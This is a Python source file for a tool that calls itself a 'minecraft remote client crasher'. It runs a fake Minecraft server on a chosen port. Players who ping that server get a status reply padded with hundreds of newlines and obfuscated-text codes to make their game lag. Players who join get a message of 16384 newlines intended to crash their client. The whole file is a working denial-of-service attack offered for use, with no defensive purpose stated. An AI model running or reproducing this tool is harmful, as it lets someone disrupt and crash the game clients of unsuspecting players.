import os
import sys
import json
import socket
import struct
import argparse
import itertools

from rich.console import Console
from rich.table import Table

console = Console(
)

BANNER = '''
[green]
         
  _____   ___________   ____  ____  
 /     \_/ ___\_  __ \_/ ___\/ ___\ 
|  Y Y  \  \___|  | \/\  \__\  \___   [white]version 1.0[/white]
|__|_|  /\___  >__|    \___  >___  >  [white]by github.com/dropsql[/white]
      \/     \/            \/    \/ 
[/green]
[green]m[/green]ine[green]c[/green]raft [green]r[/green]emote [green]c[/green]lient [green]c[/green]rasher

'''

console.print(BANNER)

parser = argparse.ArgumentParser(usage='%(prog)s [options]', add_help=False)

parser.add_argument('-h', '--help', required=False, action='store_true', help='show help menu', dest='help')
parser.add_argument('-l', '--lhost', default='0.0.0.0', required=False, metavar='', help='local host (default: 0.0.0.0)', dest='host', type=str)
parser.add_argument('-p', '--port', default=1337, required=False, metavar='', help='local port (default: 1337)', dest='port', type=int)
parser.add_argument('-m', '--message', default='hello world', required=False, metavar='', help='motd\'s message', dest='message', type=str)
parser.add_argument('--motd-lag', default=None, required=False, action='store_true', help='make the user\'s mniecraft lag when he ping the server', dest='motd_lag')
parser.add_argument('--join-crash', default=None, required=False, action='store_true', help='crash the user\'s minecraft when he joins the server', dest='join_crash')


args = parser.parse_args()

table = Table(style='green')
table.add_column('argument', style='#32a84e', header_style='white')
table.add_column('default value', style='#32a84e', header_style='white')
table.add_column('description', style='#32a84e', header_style='white')
table.add_column('type', style='#32a84e', header_style='white')
table.add_row('-h/--help', '-', 'show help menu', '-')
table.add_row('-l/--lhost', '0.0.0.0', 'set local host', 'string')
table.add_row('-p/--port', '1337', 'set local port', 'int')
table.add_row('-m/--message', 'hello world', 'set motds message', 'string')
table.add_row('--motd-lag', '-', 'make the user\'s minecraft lag when he ping the server', 'string')
table.add_row('--join-crash', '-', 'crash the user\'s minecraft when he joins the server', 'string')

if args.help:
    console.print(table)
    sys.exit(-1)

LHOST = args.host
LPORT = args.port
MESSAGE = args.message

if not args.motd_lag and not args.join_crash:
    console.print(table)
    sys.exit(-1)

def make_rainbow(message : str) -> str:
    '''
    make string raibow 
    '''

    colors = itertools.cycle(['§a', '§2', '§b', '§3', '§c', '§4', '§d', '§5', '§e', '§6', '§f', '§7'])
    out = ''
    for char in message:
        out += next(colors) + char
    return out

def varint_unpack(s : bytes) -> tuple[int, str]:
    '''
    unpack varint from bytes
    '''

    d, l = 0, 0
    length = len(s)
    if length > 5:
        length = 5
    for i in range(length):
        l += 1
        b = s[i]
        d |= (b & 0x7F) << 7 * i
        if not b & 0x80:
            break
    return (d, s[l:])


def varint_pack(d : int) -> bytes:
    '''
    pack int to varint
    '''
    o = b''
    while True:
        b = d & 0x7F
        d >>= 7
        o += struct.pack("B", b | (0x80 if d > 0 else 0))
        if d == 0:
            break
    return o

def data_pack(data : bytes) -> bytes:
    '''
    make a packet understable by minecraft
    '''
    return varint_pack(len(data)) + data

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server.bind((LHOST, LPORT))

console.log('server listening on %s:%s' % (LHOST, LPORT))
server.listen(1337)

while True:
    remote_socket, remote_addr = server.accept()
    try:
        buf = remote_socket.recv(1)
        packet_lenght, _ = varint_unpack(buf)

        data = remote_socket.recv(packet_lenght)
        packet_id, data = varint_unpack(data)

        packet_id = hex(packet_id)
        
        if packet_id == '0x0' and data.endswith(b'\x01'):
            payload = json.dumps({
                'version': {
                    'name': '\n' * 733 if args.motd_lag else 'friendly server', 
                    'protocol': varint_unpack(data)[0]
                }, 'players': {
                    'max': 0,
                    'online': 1337
                }, 
                'description': make_rainbow(MESSAGE) + ('\n' * 5) + ('§ka' * 64 + '\n') * 60 if args.motd_lag else make_rainbow(MESSAGE), 
                'modinfo': {
                    'type': 'FML', 
                    'modList': []
                },
            }).encode()

            packet = data_pack(b'\x00' + data_pack(payload))

            remote_socket.send(packet)
        
        elif packet_id == '0x0' and data.endswith(b'\x02') and args.join_crash:
            packet = data_pack(b'\x00' + data_pack(b'{"text":"' + (b'\n' * 16384) + b'"}'))
            remote_socket.send(packet)

    except Exception as e:
        pass